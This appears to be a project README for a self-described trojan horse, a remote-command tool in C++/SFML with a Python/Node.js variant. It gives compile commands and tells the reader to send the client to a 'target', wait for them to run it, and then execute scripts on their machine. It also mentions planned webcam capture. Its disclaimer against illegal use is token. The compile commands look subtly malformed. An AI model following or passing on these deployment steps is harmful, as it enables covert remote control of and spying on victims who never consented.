# trojan-horse
trajos horse I developed twice : one in C++ using SFML and one with a clent in python and the server with node.JS. I may add a video transfer from webcam feature with openCV.
I strongly advise you to not use it for illegal purposes

if you want to use the one in C++ :
    If you compile with g++ : 
        install sfml : 
               https://www.sfml-dev.org/download.php
        use the command :
        To launch the server :
              $  g++ server.cpp -c && g++ server.o -o -lsfml-network && ./server

        To compile the client : 
              $  g++ client.cpp -c && g++ client.o -o -lsfml-network && ./client

    Send the file obtained to your target.
    Wait for him to click on it to execute it.
    you will then be able to run script through server CLI and the modifications will be applied on the client.
